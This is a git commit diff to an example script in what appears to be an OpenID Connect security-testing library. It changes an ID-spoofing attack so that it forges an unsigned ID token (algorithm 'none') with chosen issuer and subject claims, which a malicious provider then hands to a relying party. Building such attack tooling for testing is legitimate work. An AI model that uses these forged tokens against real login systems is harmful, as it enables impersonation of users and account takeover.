ada19e5b112ddc09135f543b2a007c3ffaa0357a
melonattacker <junkitombob@gmail.com>
2023-08-02 11:19:09 +0900

    UPDATE: id_spoofing

--- examples/rp/id_spoofing.py
+++ examples/rp/id_spoofing.py
@@ -1,6 +1,7 @@
 import sys
 import os
 import time
+import jwt
 
 sys.path.append(os.path.join(os.path.dirname(__file__), '../../osbtlib'))
 
@@ -26,8 +27,7 @@ bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}
 
 try:
     # create malicious id_token
-    original_id_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleXN0b3JlLUNIQU5HRS1NRSJ9.eyJzdWIiOiJob2dlIiwiYXRfaGFzaCI6InBqZ3FVZ25yb0x0RldGSDFKMHBncFEiLCJhdWQiOiJjbGllbnQiLCJleHAiOjE2ODc1OTk3MDgsImlhdCI6MTY4NzU5NjEwOCwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwIn0.tzdJYBUuTs4q-pU8pCEm3mUp4DbXZfihrZbA4M_nKQryl9S3q7bvYaj8c-dFLidGiQXSKhMX8s1WE9rNolSmPosvyBYZiRjMWDEFK8NWY4MPZ882jNy64gk-ShwZC_x2fsZ3emobQjaRrtVu3YozmE9pbPvLX8U3l46zMogQqKJfvGCHIS1lmxs4iVEnlUDHn36m4_35SrzPF5a_jry_RUpmx9_CsryzdDGM6VzovmID0PZqeSoJ9MQJbkn5oEfG70XoykAATxQsmA-HHkmfo8WbqZko1xYwzFvi8ig-K6D33Tod-KMInt9wMYpPHPmv4lZchLeZSOVgTCbwp003Bw"
-    malicious_id_token = osbt.id_token.replace_payload(original_id_token, {"sub": "huga"})
+    malicious_id_token = jwt.encode({"issuer": "http://localhost:9997/", "sub": "hoge"}, key="", algorithm="none")
 
     # send order to attacker op
     res = osbt.attacker_op.replace_id_token(malicious_id_token)
